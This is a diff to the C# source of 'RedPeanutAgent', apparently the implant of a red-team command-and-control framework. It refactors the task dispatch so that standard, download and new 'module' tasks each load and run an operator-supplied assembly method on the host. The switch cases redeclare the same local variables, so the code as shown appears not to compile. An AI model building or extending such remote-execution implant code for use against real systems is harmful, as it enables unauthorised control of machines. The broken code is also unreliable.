@@ -87,7 +87,7 @@ namespace RedPeanutAgent.Execution
             SendResponse(output);
         }
 
-        public void ExecuteLocal()
+        public void ExecuteModuleManaged()
         {
             string output = "";
             try
@@ -98,21 +98,29 @@ namespace RedPeanutAgent.Execution
                 Console.SetOut(sw);
                 Console.SetError(sw);
 
-                if (task.TaskType.Equals("standard"))
+                switch(task.TaskType)
                 {
-                    string classname = task.StandardTask.Moduleclass;
-                    string assembly = task.StandardTask.Assembly;
-                    string method = task.StandardTask.Method;
-                    string[] paramsv = task.StandardTask.Parameters;
-                    Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
-                }
-                else
-                {
-                    string classname = task.DownloadTask.Moduleclass;
-                    string assembly = task.DownloadTask.Assembly;
-                    string method = task.DownloadTask.Method;
-                    string[] paramsv = task.DownloadTask.Parameters;
-                    Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                    case "standard":
+                        string classname = task.StandardTask.Moduleclass;
+                        string assembly = task.StandardTask.Assembly;
+                        string method = task.StandardTask.Method;
+                        string[] paramsv = task.StandardTask.Parameters;
+                        Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
+                    case "download":
+                        string classname = task.DownloadTask.Moduleclass;
+                        string assembly = task.DownloadTask.Assembly;
+                        string method = task.DownloadTask.Method;
+                        string[] paramsv = task.DownloadTask.Parameters;
+                        Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
+                    case "module":
+                        string classname = task.ModuleTask.Moduleclass;
+                        string assembly = task.ModuleTask.Assembly;
+                        string method = task.ModuleTask.Method;
+                        string[] paramsv = task.ModuleTask.Parameters;
+                        Utility.RunAssembly(assembly, classname, method, new object[] { paramsv });
+                        break;
                 }
 
                 output = myb.ToString();
@@ -145,7 +153,7 @@ namespace RedPeanutAgent.Execution
             SendResponse(output);
         }
 
-        public void ExecuteModule()
+        public void ExecuteModuleUnManaged()
         {
 
             string output = "";
